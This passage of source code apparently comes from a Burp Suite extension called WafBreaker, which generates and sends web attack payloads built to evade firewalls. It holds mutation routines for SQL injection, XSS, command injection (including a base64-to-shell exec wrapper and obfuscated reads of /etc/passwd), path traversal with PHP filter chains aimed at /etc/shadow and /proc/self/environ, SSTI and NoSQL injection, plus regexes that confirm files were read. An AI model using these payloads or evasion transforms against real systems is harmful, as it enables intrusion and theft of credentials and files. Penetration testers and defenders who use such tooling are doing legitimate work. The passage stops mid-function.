    ("3 BETWEEN 2 AND 4",       "between_large"),
    ("1 IN(1,2,3)",             "in_list"),
    ("2 NOT IN(3,4,5)",         "not_in"),
    ("'a'='a'",                 "string_equality"),
    ("'x'='x'",                 "string_equality_x"),
    ("'abc'='abc'",             "string_equality_word"),
    ("NULL IS NULL",            "null_is_null"),
    ("1 LIKE 1",                "like_numeric"),
    ("'a' LIKE 'a'",            "like_string"),
    ("TRUE",                    "keyword_true"),
    ("NOT FALSE",               "not_false"),
    ("NOT(1=2)",                "not_parens"),
    ("(1=1)",                   "parens_tautology"),
    ("((1=1))",                 "double_parens"),
    ("1.0=1",                   "float_comparison"),
    ("1e0=1",                   "scientific_comparison"),
    ("0x31=0x31",               "hex_equality"),
    ("CHAR(49)=CHAR(49)",       "char_function"),
    ("ASCII('A')=65",           "ascii_function"),
    ("LENGTH('x')=1",           "length_function"),
    ("ABS(-1)=1",               "abs_function"),
    ("LOWER('a')='a'",          "lower_function"),
    ("UPPER('A')='A'",          "upper_function"),
    ("SUBSTR('abc',1,1)='a'",   "substr_function"),
    ("COALESCE(1,0)=1",         "coalesce_function"),
    ("IFNULL(1,0)=1",           "ifnull_function"),
    ("(SELECT 1)=1",            "subquery_scalar"),
    ("(SELECT 2+3)=5",          "subquery_arithmetic"),
    ("MID('AB',1,1)='A'",       "mid_function"),
    ("TRIM(' a ')='a'",         "trim_function"),
    ("REVERSE('ab')='ba'",      "reverse_function"),
    ("HEX(255)='FF'",           "hex_function"),
    ("UNHEX('61')='a'",         "unhex_function"),
    ("BIN(1)='1'",              "bin_function"),
    ("OCT(8)='10'",             "oct_function"),
    ("SIGN(5)=1",               "sign_function"),
    ("FLOOR(1.9)=1",            "floor_function"),
    ("CEIL(1.1)=2",             "ceil_function"),
    ("MOD(5,2)=1",              "mod_function"),
    ("POW(2,3)=8",              "pow_function"),
    ("ROUND(1.4)=1",            "round_function"),
]

_SQLI_WS = [
    ("/**/",    "comment"),
    ("%09",     "tab_urlenc"),
    ("%0a",     "newline_urlenc"),
    ("%0d",     "cr_urlenc"),
    ("%0b",     "vtab_urlenc"),
    ("%0c",     "ff_urlenc"),
    ("%a0",     "nbsp_urlenc"),
    ("\t",      "tab_raw"),
    ("\n",      "newline_raw"),
    ("/*!*/",   "empty_version_comment"),
    ("/*--*/",  "comment_dashes"),
]

_SQLI_KEYWORDS = {
    "AND":    ["AnD", "aNd", "&&", "/*!AND*/",    "/*!50000AND*/", "/**AND**/"],
    "OR":     ["oR",  "Or",  "||", "/*!OR*/",     "/**OR**/"],
    "SELECT": ["SeLeCt", "/*!SELECT*/", "/*!50000SELECT*/", "SeLeC\x00t"],
    "UNION":  ["UnIoN",  "/*!UNION*/",  "UnI/**/oN"],
    "WHERE":  ["wHeRe",  "/*!WHERE*/"],
    "FROM":   ["FrOm",   "/*!FROM*/"],
    "SLEEP":  ["SLeeP",  "SlEeP"],
    "ORDER":  ["OrDeR",  "oRdEr"],
    "BY":     ["bY",     "By"],
    "LIMIT":  ["LiMiT",  "lImIt"],
}

_SQLI_OPS = [
    ("=1 AND",  "=1/**/AND",  "comment_before_and"),
    (" = ",     "%20=%20",    "urlenc_equals"),
    ("=",       " LIKE ",     "like_for_equals"),
    (">",       " BETWEEN X AND 9999 AND X", "between_for_gt"),
]


def _systematic_sqli(payload):
    results = []
    seen = set()

    def _add(p, label):
        if p not in seen and p != payload:
            seen.add(p)
            results.append((p, label))

    cond_match = re.search(
        r'\b(AND|OR)\s+([^\-\-#\n]+?)(\s*(?:--|#|/\*))',
        payload, re.IGNORECASE)
    if cond_match:
        prefix  = payload[:cond_match.start(2)]
        suffix  = payload[cond_match.end(2):]
        op_word = cond_match.group(1)
        for equiv, label in _SQLI_TRUE_EQUIV:
            _add(prefix + equiv + " " + suffix.lstrip(), "T1:sem:%s" % label)
    else:
        for equiv, label in _SQLI_TRUE_EQUIV[:10]:
            rewritten = re.sub(r'1\s*=\s*1', equiv, payload, flags=re.IGNORECASE)
            _add(rewritten, "T1:rewrite:%s" % label)
            rewritten2 = re.sub(r"'1'\s*=\s*'1'", "'" + equiv.split("=")[0].strip() + "'='" + equiv.split("=")[0].strip() + "'", payload)
            _add(rewritten2, "T1:str:%s" % label)

    for ws_repl, ws_label in _SQLI_WS:
        _add(payload.replace(" ", ws_repl), "T2:ws:%s" % ws_label)
        _add(re.sub(r'(\bAND\b|\bOR\b) ', r'\1' + ws_repl, payload, flags=re.IGNORECASE),
             "T2:ws_kw:%s" % ws_label)

    for kw, variants in _SQLI_KEYWORDS.items():
        if re.search(r'\b' + kw + r'\b', payload, re.IGNORECASE):
            for variant in variants:
                _add(re.sub(r'\b' + kw + r'\b', variant, payload, flags=re.IGNORECASE),
                     "T3:kw:%s->%s" % (kw, variant[:8]))

    for digit in ['0', '1', '2', '3']:
        if digit in payload:
            _add(payload.replace(digit, "0x3" + digit, 1), "T4:hex:0x3%s" % digit)
            _add(payload.replace(digit, "CHAR(%d)" % ord(digit), 1), "T4:char:%s" % digit)
            _add(payload.replace(digit, digit + ".0", 1),  "T4:float:%s.0" % digit)
            _add(payload.replace(digit, digit + "e0", 1),  "T4:sci:%se0" % digit)

    inner_match = re.search(r"(AND|OR)\s+(.+?)\s*(--|#|$)", payload, re.IGNORECASE)
    if inner_match:
        _add(payload[:inner_match.start(2)] + "(" + inner_match.group(2) + ")" +
             payload[inner_match.end(2):], "T5:wrap_parens")
        _add(payload[:inner_match.start(2)] + "((" + inner_match.group(2) + "))" +
             payload[inner_match.end(2):], "T5:double_parens")

    _add(re.sub(r'\b(AND|OR)\b', r'/*!50000\1*/', payload, flags=re.IGNORECASE),
         "T6:version_comment")
    _add(re.sub(r'\b(AND|OR)\b', r'/*!80000\1*/', payload, flags=re.IGNORECASE),
         "T6:version_comment_8")

    combined = payload.replace(" ", "/**/")
    for kw, variants in list(_SQLI_KEYWORDS.items())[:3]:
        combined = re.sub(r'\b' + kw + r'\b', variants[0], combined,
                          flags=re.IGNORECASE, count=1)
    _add(combined, "T7:combined_ws_kw")

    return results


def _systematic_xss(payload):
    results = []
    seen = set()

    def _add(p, label):
        if p not in seen and p != payload:
            seen.add(p)
            results.append((p, label))

    _events = [
        "onerror", "onload", "onfocus", "onclick", "onmouseover", "ontoggle",
        "onstart", "onpointerover", "onanimationend", "onwheel", "oninput",
        "onblur", "onkeyup", "oncut", "oncopy", "onpaste", "ondrag",
        "onpointerenter", "onscroll", "onsearch", "onbeforeinput",
    ]
    for ev in _events:
        m = _add(re.sub(r'\bon\w+\b', ev, payload, count=1, flags=re.IGNORECASE),
                 "T1:event:%s" % ev)

    _tags = ["img", "svg", "video", "audio", "body", "details", "input",
             "select", "textarea", "iframe", "object", "embed", "marquee"]
    for tag in _tags:
        _add(re.sub(r'<\w+\b', "<" + tag, payload, count=1), "T2:tag:<%s>" % tag)

    _add(re.sub(r'(on\w+)(=)', r'\1\t\2', payload, count=1), "T3:tab_in_event")
    _add(re.sub(r'(on\w+)(=)', r'\1\n\2', payload, count=1), "T3:lf_in_event")
    _add(re.sub(r'(on\w+)(=)', r'\1 \2',  payload, count=1), "T3:sp_in_event")
    _add(re.sub(r'(on\w+)(=)', r'\1\x00\2', payload, count=1), "T3:null_in_event")

    for ch_from, ch_to, label in [
        ("on", "o&#110;", "entity_n"),
        ("on", "o\x00n",  "null_in_on"),
        ("er", "&#101;r", "entity_e"),
        ("al", "&#97;l",  "entity_a"),
    ]:
        _add(payload.replace(ch_from, ch_to, 1), "T4:enc:%s" % label)

    _add(re.sub(r'\b(on\w+)\b', lambda m: m.group(1).upper(),    payload), "T5:event_upper")
    _add(re.sub(r'\b(on\w+)\b', lambda m: m.group(1).title(),    payload), "T5:event_title")
    _add(re.sub(r'\b(on\w+)\b', lambda m: m.group(1).swapcase(), payload), "T5:event_swap")

    for alt in ["confirm(1)", "prompt(1)", "alert`1`", "(alert)(1)",
                "eval('ale'+'rt(1)')", "window['ale'+'rt'](1)",
                "top['al'+'ert'](1)", "self[`ale`+`rt`](1)"]:
        _add(re.sub(r'alert\([^)]*\)', alt, payload), "T6:fn:%s" % alt[:12])

    _add("'>" + payload,    "T7:sq_breakout")
    _add("\">" + payload,   "T7:dq_breakout")
    _add("</tag>" + payload, "T7:close_tag")
    _add(payload.replace('"', "'"),  "T7:dq_to_sq")
    _add(payload.replace("'", "\""), "T7:sq_to_dq")

    return results


def _systematic_cmdi(payload):
    results = []
    seen = set()

    def _add(p, label):
        if p not in seen and p != payload:
            seen.add(p)
            results.append((p, label))

    for sep_from, seps in [
        (";",  ["|", "&&", "||", "&", "%0a", "%0d%0a", "`", "$(", ";"]),
        ("|",  [";", "&&", "||", "&", "%0a"]),
        ("&&", [";", "|",  "||"]),
    ]:
        if sep_from in payload:
            for sep_to in seps:
                if sep_to != sep_from:
                    _add(payload.replace(sep_from, sep_to, 1),
                         "T1:sep:%s->%s" % (sep_from, sep_to.replace("%", "pct_")))

    for ws, label in [("${IFS}", "ifs"), ("%09", "tab"), ("%0a", "lf"), ("\t", "tab_raw"), ("<", "redir")]:
        _add(payload.replace(" ", ws), "T2:ws:%s" % label)

    _cmd_alts = {
        "id":               ["whoami", "uname${IFS}-a", "hostname"],
        "whoami":           ["id", "echo${IFS}$USER"],
        "cat /etc/passwd":  ["cat${IFS}/etc/passwd", "/bin/cat /etc/passwd",
                             "head${IFS}/etc/passwd", "less /etc/passwd"],
        "cat":              ["c'a't", "c\"a\"t", "/b'i'n/cat", "\\cat",
                             "$(printf \\x63\\x61\\x74)"],
    }
    for cmd, alts in _cmd_alts.items():
        if cmd in payload:
            for alt in alts:
                _add(payload.replace(cmd, alt, 1), "T3:cmd:%s" % alt[:12])

    _add(payload.replace("cat", "c'a't"),         "T4:split_sq")
    _add(payload.replace("cat", "c\"a\"t"),        "T4:split_dq")
    _add(payload.replace("/bin/", "/b''in/"),      "T4:split_bin")
    _add(payload.replace("/etc/", "/e''tc/"),      "T4:split_etc")

    _add(payload.replace("/etc/passwd", "/???/p?ss??"),  "T5:glob_passwd")
    _add(payload.replace("/bin/",       "/b??/"),        "T5:glob_bin")
    _add(payload.replace("cat",         "/???/c?t"),     "T5:glob_cat")

    import base64 as _b64
    try:
        cmd_part = re.search(r'[;|&]\s*(.+)', payload)
        if cmd_part:
            cmd_b64 = _b64.b64encode(cmd_part.group(1).encode()).decode()
            _add(payload[:cmd_part.start(1)] + "$(echo %s|base64 -d|sh)" % cmd_b64,
                 "T6:b64_exec")
    except Exception:
        pass

    _add(re.sub(r';(\s*)(\w)', r';IFS=_;X=\2', payload), "T7:ifs_manip")
    _add(payload + ";true", "T7:noop_suffix")

    return results


def _systematic_lfi(payload):
    results = []
    seen = set()

    def _add(p, label):
        if p not in seen and p != payload:
            seen.add(p)
            results.append((p, label))

    for depth in range(2, 9):
        travs = "../" * depth
        for target in ["/etc/passwd", "/etc/shadow", "/proc/self/environ", "etc/passwd"]:
            _add(travs + target, "T1:depth%d" % depth)

    _encodings = [
        ("../",  "%2e%2e/",        "urlenc_dots"),
        ("../",  "..%2f",          "urlenc_slash"),
        ("../",  "%2e%2e%2f",      "urlenc_all"),
        ("../",  "....//",         "double_dot_slash"),
        ("../",  "..;/",           "semicolon"),
        ("../",  "%252e%252e/",    "double_urlenc"),
        ("../",  "..%c0%af",       "overlong_slash"),
        ("../",  "%c0%ae%c0%ae/",  "overlong_dot"),
        ("../",  "\\..",           "backslash"),
        ("../",  "..\\",           "backslash2"),
    ]
    for from_str, to_str, label in _encodings:
        if from_str in payload:
            _add(payload.replace(from_str, to_str), "T2:%s" % label)

    for ext in [".php", ".html", ".jpg", ".png", ".gif", ".txt"]:
        _add(payload + "%00" + ext, "T3:null_ext:%s" % ext)
        _add(payload + "\x00" + ext, "T3:null_raw:%s" % ext)

    for from_p, to_p in [
        ("/etc/passwd", "/etc/./passwd"),
        ("/etc/passwd", "/etc//passwd"),
        ("/etc/passwd", "/etc/passwd%20"),
        ("/etc/passwd", "/etc/PASSWD"),
        ("etc/passwd",  "ETC/PASSWD"),
    ]:
        _add(payload.replace(from_p, to_p), "T4:alt_path")

    return results


def _systematic_ssti(payload):
    results = []
    seen = set()

    def _add(p, label):
        if p not in seen and p != payload:
            seen.add(p)
            results.append((p, label))

    for tmpl_open, tmpl_close, label in [
        ("{{", "}}",   "jinja2_curly"),
        ("${", "}",    "el_dollar"),
        ("#{", "}",    "ruby_hash"),
        ("<%= ", " %>","erb"),
        ("%{", "}",    "percent_brace"),
        ("@(", ")",    "razor"),
        ("#(", ")",    "hash_paren"),
        ("{%=", "%}",  "twig_print"),
    ]:
        _add(tmpl_open + "7*7" + tmpl_close, "T1:delim:%s" % label)
        _add(tmpl_open + "2413413*4342737" + tmpl_close, "T1:bignum:%s" % label)

    _add("{{ 7 * 7 }}", "T2:ws_jinja")
    _add("{{7 * 7}}",   "T2:ws_jinja_half")
    _add("${ 7 * 7 }", "T2:ws_el")

    _add("%7B%7B7*7%7D%7D",  "T3:urlenc_curlies")
    _add("&#123;&#123;7*7&#125;&#125;", "T3:html_entity_curlies")

    return results


def _systematic_nosql(payload):
    results = []
    seen = set()

    def _add(p, label):
        if p not in seen and p != payload:
            seen.add(p)
            results.append((p, label))

    for op_from, op_to in [
        ("$ne",  "$gt"),
        ("$ne",  "$lt"),
        ("$ne",  "$gte"),
        ("$ne",  "$lte"),
        ("$ne",  "$nin"),
        ("$gt",  "$ne"),
        ("$gt",  "$gte"),
        ("$gt",  "$exists"),
        ("$regex", "$where"),
    ]:
        if op_from in payload:
            _add(payload.replace(op_from, op_to, 1), "T1:op:%s->%s" % (op_from, op_to))

    _add(payload.replace("$", "%24"),  "T2:urlenc_dollar")
    _add(payload.replace("[", "%5B").replace("]", "%5D"), "T2:urlenc_brackets")

    return results


_MUTATION_DISPATCH = {
    "SQL Injection":     _systematic_sqli,
    "XSS":               _systematic_xss,
    "Command Injection": _systematic_cmdi,
    "LFI":               _systematic_lfi,
    "SSTI":              _systematic_ssti,
    "NoSQL Injection":   _systematic_nosql,
}


def _get_systematic_mutations(vtype, payload):
    fn = _MUTATION_DISPATCH.get(vtype)
    if fn is None:
        return []
    try:
        return fn(payload)[:MAX_MUTATIONS_PER_PAYLOAD]
    except Exception:
        return []



def lfi_double_urlencode(path):
    return path.replace('.', '%252E').replace('/', '%252F').replace('\\', '%255C')


def lfi_double_urlencode_slash_only(path):
    return path.replace('/', '%252F')


def lfi_unicode_u002f(path):
    return path.replace('/', '%u002f')


def lfi_unicode_u2215(path):
    return path.replace('/', '%u2215')


def lfi_unicode_uff0f(path):
    return path.replace('/', '%uff0f')


def lfi_overlong_c0af(path):
    return path.replace('/', '%c0%af')


def lfi_overlong_e080af(path):
    return path.replace('/', '%e0%80%af')


def lfi_encoded_dotslash_full(path):
    return path.replace('../', '%2e%2e%2f').replace('..\\', '%2e%2e%5c')


def lfi_encoded_dotslash_dotonly(path):
    return path.replace('../', '%2e%2e/').replace('..\\', '%2e%2e\\')


def lfi_dot_slash_mixed_enc(path):
    return path.replace('../', '%2e./')


def lfi_mixed_slash_enc(path):
    return path.replace('../', '.%2F./')


def lfi_dotdot_double_slash(path):
    return path.replace('../', '....//')


def lfi_dotdot_triple_slash(path):
    return path.replace('../', '.....///')


def lfi_semicolon_sep(path):
    return path.replace('../', '..;/')


def lfi_path_params(path):
    return path.replace('../', '..;x=y/')


def lfi_valid_prefix(path):
    if not path.startswith('php://') and not path.startswith('/'):
        return 'images/' + path
    return path


def lfi_extra_slash(path):
    return path.replace('../', '..//').replace('/', '//')


def lfi_backslash(path):
    return path.replace('/', '\\')


def lfi_encoded_backslash(path):
    return path.replace('/', '%5c')


def lfi_double_encoded_backslash(path):
    return path.replace('/', '%255c')


def lfi_null_byte(path):
    if not path.endswith('%00'):
        return path + '%00'
    return path


def lfi_null_byte_jpg(path):
    return path + '%00.jpg'


def lfi_null_byte_php(path):
    return path + '%00.php'


def lfi_uppercase_path(path):
    out = []
    i = 0
    while i < len(path):
        if path[i] == '%' and i + 2 < len(path):
            out.append(path[i:i+3])
            i += 3
        else:
            out.append(path[i].upper())
            i += 1
    return ''.join(out)


def lfi_php_filter_b64(path):
    return 'php://filter/convert.base64-encode/resource=' + path


def lfi_php_filter_rot13(path):
    return 'php://filter/string.rot13/resource=' + path


def lfi_php_filter_iconv_chain(path):
    chain = (
        "php://filter/"
        "convert.iconv.UTF-8.CSISO2022KR|"
        "convert.base64-encode|"
        "convert.iconv.UTF-8.UTF7|"
        "convert.iconv.UTF-8.UTF16LE|"
        "convert.iconv.UTF-8.CSISO2022KR|"
        "convert.base64-encode|"
        "convert.iconv.UTF-8.UTF7"
        "/resource="
    )
    return chain + path


def lfi_compress_zlib(path):
    return 'compress.zlib://' + path


def lfi_encoded_slash_only(path):
    return path.replace('/', '%2f')


def lfi_uppercase_hex(path):
    return path.replace('.', '%2E').replace('/', '%2F').replace('\\', '%5C')


def lfi_double_enc_dots_only(path):
    return path.replace('.', '%252e')


def lfi_overlong_dot(path):
    return path.replace('.', '%c0%ae')


def lfi_overlong_dot_slash(path):
    return path.replace('.', '%c0%ae').replace('/', '%c0%af')


def lfi_unicode_big_solidus(path):
    return path.replace('/', '%e2%a7%b8')


def lfi_unicode_fraction_slash(path):
    return path.replace('/', '%e2%81%84')


def lfi_unicode_fullwidth_dot(path):
    return path.replace('.', '%ef%bc%8e')


def lfi_four_dots(path):
    return path.replace('../', '..../')


def lfi_five_dots(path):
    return path.replace('../', '......//')


def lfi_null_double_enc(path):
    return path + '%2500'


def lfi_newline_truncate(path):
    return path + '%0a'


def lfi_cr_truncate(path):
    return path + '%0d'


def lfi_iis_overlong_bsl(path):
    return path.replace('/', '%c1%1c')


def lfi_iis_overlong_bsl2(path):
    return path.replace('/', '%c0%9v')


def lfi_triple_urlencode(path):
    return path.replace('.', '%25252E').replace('/', '%25252F')


def lfi_aspnet_tilde(path):
    if path.startswith(('php://', 'file://', 'phar://')):
        return path
    return '~/' + path.lstrip('./')


def lfi_file_wrapper(path):
    if path.startswith(('php://', 'file://', 'phar://', 'zip://', 'compress.')):
        return path
    if path.startswith('/'):
        return 'file://' + path
    return 'file:///' + path.lstrip('./')


def lfi_php_filter_utf16(path):
    return ('php://filter/convert.iconv.UTF-8.UTF-16BE'
            '|convert.base64-encode/resource=' + path)


def lfi_php_filter_zlib_b64(path):
    return 'php://filter/zlib.deflate|convert.base64-encode/resource=' + path


def lfi_php_phar(path):
    if path.startswith(('php://', 'phar://')):
        return path
    return 'phar://' + path


def lfi_dot_segment_inject(path):
    return path.replace('../', './../')


def lfi_encoded_dotslash_uppercase(path):
    return path.replace('../', '%2E%2E%2F').replace('..\\', '%2E%2E%5C')


LFI_TAMPERS = [
    ("double-urlencode",          lfi_double_urlencode,           ".->%252E /->%252F"),
    ("double-urlencode-slash",    lfi_double_urlencode_slash_only,"/->%252F (slash only)"),
    ("overlong-utf8-c0af",        lfi_overlong_c0af,              "/->%c0%af"),
    ("overlong-utf8-e080af",      lfi_overlong_e080af,            "/->%e0%80%af"),
    ("unicode-u002f",             lfi_unicode_u002f,              "/->%u002f"),
    ("unicode-u2215",             lfi_unicode_u2215,              "/->%u2215 division slash"),
    ("unicode-uff0f",             lfi_unicode_uff0f,              "/->%uff0f fullwidth"),
    ("encoded-dotslash-full",     lfi_encoded_dotslash_full,      "../->%2e%2e%2f"),
    ("encoded-dotslash-dotonly",  lfi_encoded_dotslash_dotonly,   "../->%2e%2e/"),
    ("dot-slash-mixed-enc",       lfi_dot_slash_mixed_enc,        "../->%2e./"),
    ("mixed-slash-enc",           lfi_mixed_slash_enc,            "../->.%2F./"),
    ("dotdot-double-slash",       lfi_dotdot_double_slash,        "../->....//"),
    ("dotdot-triple-slash",       lfi_dotdot_triple_slash,        "../->.....///"),
    ("semicolon-sep",             lfi_semicolon_sep,              "../->..;/ (Java)"),
    ("path-params",               lfi_path_params,                "../->..;x=y/"),
    ("valid-prefix",              lfi_valid_prefix,               "prefix images/"),
    ("extra-slash",               lfi_extra_slash,                "/->// normalises"),
    ("null-byte",                 lfi_null_byte,                  "append %00"),
    ("null-byte-jpg",             lfi_null_byte_jpg,              "append %00.jpg"),
    ("null-byte-php",             lfi_null_byte_php,              "append %00.php"),
    ("backslash",                 lfi_backslash,                  "/->\\"),
    ("encoded-backslash",         lfi_encoded_backslash,          "/->%5c"),
    ("double-encoded-backslash",  lfi_double_encoded_backslash,   "/->%255c"),
    ("uppercase",                 lfi_uppercase_path,             "PATH->UPPERCASE"),
    ("php-filter-b64",            lfi_php_filter_b64,             "php://filter/b64"),
    ("php-filter-rot13",          lfi_php_filter_rot13,           "php://filter/rot13"),
    ("php-filter-iconv-chain",    lfi_php_filter_iconv_chain,     "multi-stage iconv chain"),
    ("compress-zlib",             lfi_compress_zlib,              "compress.zlib://"),
    ("encoded-slash-only",        lfi_encoded_slash_only,         "/->%2f (slash only, raw dots)"),
    ("uppercase-hex",             lfi_uppercase_hex,              ".->%2E /->%2F uppercase hex"),
    ("double-enc-dots",           lfi_double_enc_dots_only,       ".->%252e (double dots, raw slash)"),
    ("overlong-dot",              lfi_overlong_dot,               ".->%c0%ae overlong dot"),
    ("overlong-dot-slash",        lfi_overlong_dot_slash,         ".->%c0%ae /->%c0%af both overlong"),
    ("unicode-big-solidus",       lfi_unicode_big_solidus,        "/->%e2%a7%b8 U+29F8"),
    ("unicode-fraction-slash",    lfi_unicode_fraction_slash,     "/->%e2%81%84 U+2044"),
    ("unicode-fullwidth-dot",     lfi_unicode_fullwidth_dot,      ".->%ef%bc%8e U+FF0E"),
    ("four-dots",                 lfi_four_dots,                  "../->..../"),
    ("five-dots",                 lfi_five_dots,                  "../->......//"),
    ("null-double-enc",           lfi_null_double_enc,            "append %2500 (double-enc null)"),
    ("newline-truncate",          lfi_newline_truncate,           "append %0a (newline truncation)"),
    ("cr-truncate",               lfi_cr_truncate,                "append %0d (CR truncation)"),
    ("iis-overlong-bsl",          lfi_iis_overlong_bsl,           "/->%c1%1c (IIS5 overlong backslash)"),
    ("iis-overlong-bsl2",         lfi_iis_overlong_bsl2,          "/->%c0%9v (IIS5 alt overlong)"),
    ("triple-urlencode",          lfi_triple_urlencode,           ".->%25252E triple encode"),
    ("aspnet-tilde",              lfi_aspnet_tilde,               "~/path (ASP.NET tilde)"),
    ("file-wrapper",              lfi_file_wrapper,               "file:// wrapper"),
    ("php-filter-utf16",          lfi_php_filter_utf16,           "php://filter iconv UTF-16BE chain"),
    ("php-filter-zlib-b64",       lfi_php_filter_zlib_b64,        "php://filter zlib+b64 chain"),
    ("php-phar",                  lfi_php_phar,                   "phar:// wrapper"),
    ("dot-segment-inject",        lfi_dot_segment_inject,         "../->./.. (dot segment inject)"),
    ("encoded-dotslash-upper",    lfi_encoded_dotslash_uppercase,  "../->%2E%2E%2F uppercase full"),
]

LFI_TARGET_FILES = [
    ("../../../etc/passwd",         "/etc/passwd (3-level)",      False),
    ("../../../../etc/passwd",      "/etc/passwd (4-level)",      False),
    ("../../etc/passwd",            "/etc/passwd (2-level)",      False),
    ("../../../../../etc/passwd",   "/etc/passwd (5-level)",      False),
    ("/etc/passwd",                 "/etc/passwd (absolute)",     False),
    ("../../../etc/shadow",         "/etc/shadow (hashes)",       False),
    ("../../../etc/hosts",          "/etc/hosts",                 False),
    ("../../../proc/self/environ",  "/proc/self/environ",         False),
    ("../../../proc/version",       "/proc/version",              False),
    ("/etc/issue",                  "/etc/issue (OS banner)",     False),
    ("../../windows/win.ini",       "windows/win.ini",            False),
    ("..\\..\\windows\\win.ini",    "windows\\win.ini (BS)",      False),
    ("C:\\windows\\win.ini",        "win.ini (absolute)",         False),
    ("C:\\boot.ini",                "boot.ini",                   False),
    ("../../../var/log/apache2/access.log", "Apache access.log", False),
    ("../../../var/log/nginx/access.log",   "Nginx access.log",  False),
    ("php://filter/convert.base64-encode/resource=/etc/passwd",
     "PHP wrapper -> /etc/passwd",          True),
    ("php://filter/convert.base64-encode/resource=../../../etc/passwd",
     "PHP wrapper -> traversal /etc/passwd", True),
]

LFI_CONFIRM_PATTERNS = [
    (r"root:x:0:0",               "/etc/passwd root entry"),
    (r"daemon:x:\d+:\d+",         "/etc/passwd daemon entry"),
    (r"nobody:x:",                 "/etc/passwd nobody entry"),
    (r"/bin/bash",                 "/etc/passwd bash shell"),
    (r"/bin/sh",                   "/etc/passwd sh shell"),
    (r"nologin",                   "/etc/passwd nologin entry"),
    (r"\[extensions\]",            "win.ini extensions section"),
    (r"for 16-bit app",            "win.ini 16-bit note"),
    (r"\[boot loader\]",           "boot.ini boot loader section"),
    (r"PROCESSOR_IDENTIFIER",      "Windows environment variable"),
    (r"HTTP_USER_AGENT",           "/proc/self/environ exposure"),
    (r"DOCUMENT_ROOT",             "/proc/self/environ web root"),
    (r"Linux version \d+\.\d+",    "kernel version string"),
    (r"[A-Za-z0-9+/]{80,}={0,2}", "base64 blob (PHP wrapper success)"),
]



class WafBreakerIssue(IScanIssue):

    ISSUE_TYPE = 0x08000000

    def __init__(self, http_service, url, http_messages,
                 name, detail, severity, confidence):
        self._svc    = http_service
        self._url    = url
        self._msgs   = http_messages
        self._name   = name
        self._detail = detail
        self._sev    = severity
        self._conf   = confidence

    def getUrl(self):                   return self._url
    def getIssueName(self):             return self._name
    def getIssueType(self):             return self.ISSUE_TYPE
    def getSeverity(self):              return self._sev
    def getConfidence(self):            return self._conf
    def getIssueBackground(self):       return (
        "WafBreaker is a Burp Suite extension that probes for WAF bypass "
        "techniques before launching a targeted vulnerability scan. "
        "Findings reported here survived or circumvented the WAF."
    )
    def getRemediationBackground(self): return (
        "Ensure WAF rules are kept up-to-date, test against encoded and "
        "obfuscated payload variants, and treat WAF bypass findings as "
        "critical gaps in your perimeter defence."
    )
    def getIssueDetail(self):           return self._detail
    def getRemediationDetail(self):     return None
    def getHttpMessages(self):          return self._msgs
    def getHttpService(self):           return self._svc



class BurpExtender(IBurpExtender, IContextMenuFactory):

    REQUEST_DELAY = 0.6

    def registerExtenderCallbacks(self, callbacks):
        self._cb      = callbacks
        self._h       = callbacks.getHelpers()
        callbacks.setExtensionName(EXT_NAME)
        callbacks.registerContextMenuFactory(self)

        self._collab_client = None
        self._collab_host   = None
        try:
            self._collab_client = callbacks.createBurpCollaboratorClientContext()
            self._collab_host   = self._collab_client.generatePayload(True)
            self._p("[*] Burp Collaborator active -- host: %s" % self._collab_host)
        except Exception:
            self._p("[!] Burp Collaborator not available (Burp Pro required) -- "
                    "Blind XSS / OOB payloads will use placeholder domain.")

        self._p("[*] WafBreaker v%s ready." % VERSION)
        self._p("[*] Results appear in: Extensions > WafBreaker > Output")
        self._p("[*] Payloads -- XSS:%d | SQLi:%d | CMDi:%d | LFI:%d | SSRF:%d" % (
            len(PAYLOADS["XSS"]), len(PAYLOADS["SQL Injection"]),
            len(PAYLOADS["Command Injection"]), len(PAYLOADS["LFI"]),
            len(PAYLOADS["SSRF"])))
        self._p("[*] LFI tamper transforms: %d  |  SQLi tamper scripts: %d" % (
            len(LFI_TAMPERS), len(SQLI_TAMPERS)))

        total_seeds = sum(len(s) for _, s in SQLI_PAYLOAD_SEEDS)
        self._p("[*] SQLi tamper seeds -- %d categories, %d total payloads" % (
            len(SQLI_PAYLOAD_SEEDS), total_seeds))

    def _p(self, msg):
        self._cb.printOutput(msg)

    def createMenuItems(self, invocation):
        self._invocation = invocation
        items = ArrayList()
        main = JMenu(u"[!] " + EXT_NAME)

        for vtype in PAYLOADS.keys():
            item = JMenuItem(vtype)
            item.addActionListener(lambda e, v=vtype: self._dispatch(v))
            main.add(item)

        items.add(main)
        return items

    def _dispatch(self, vuln_type):
        msgs = self._invocation.getSelectedMessages()
        if not msgs:
            self._p("[!] No request selected.")
            return

        bounds = None
        try:
            b = self._invocation.getSelectionBounds()
            if b and len(b) == 2 and b[0] != b[1]:
                bounds = (b[0], b[1])
        except Exception:
            pass

        class _Worker(Runnable):
            def __init__(self, ext, msg, vtype, bnd):
                self.ext   = ext
                self.msg   = msg
                self.vtype = vtype
                self.bnd   = bnd
            def run(self):
                try:
                    ScanEngine(
                        self.ext._cb,
                        self.ext._h,
                        self.ext.REQUEST_DELAY,
                        self.msg,
                        self.vtype,
                        self.bnd
                    ).run()
                except Exception as exc:
                    self.ext._cb.printOutput("[ERROR] " + str(exc))

        JThread(_Worker(self, msgs[0], vuln_type, bounds)).start()



class ScanEngine(object):

    JUNK_SIZE_BYTES = 135000

    def __init__(self, callbacks, helpers, req_delay, message, vuln_type, bounds):
        self._cb        = callbacks
        self._h         = helpers
        self._delay     = req_delay
        self._msg       = message
        self._vtype     = vuln_type
        self._bounds    = bounds
        self._svc       = message.getHttpService()
        self._base_req  = message.getRequest()
        self._waf_found = False
        self._bypass    = None
        self._req_count = 0
        self._last_http_msg = None
        self._reported_issues = set()
        self._waf_vendor       = None
        self._blocked_baseline = None
        self._clean_baseline   = None
        self._issued_high      = set()
        self._vuln_extra_payloads = {}

        try:
            from java.net import URL as _JavaURL
            _proto = "https" if self._svc.getPort() == 443 else "http"
            _host  = self._svc.getHost()
            _port  = self._svc.getPort()
            self._base_url = _JavaURL("%s://%s:%d/" % (_proto, _host, _port))
        except Exception:
            self._base_url = None

    def _log(self, msg):
        self._cb.printOutput("[WafBreaker][%s] %s" % (self._vtype, msg))

    def _report(self, technique, payload, status, body, outcome):
        snippet = (body[:100].replace('\n', ' ').replace('\r', '')) if body else ""
        line = "[%s] %-40s HTTP %-3d | %s | %s" % (
            outcome.ljust(7), technique[:40], status,
            payload[:70].replace('\n', ' '), snippet[:60])
        self._cb.printOutput(line)

    def _send(self, req_bytes):
        if self._req_count > 0:
            time.sleep(self._delay)
        self._req_count += 1
        try:
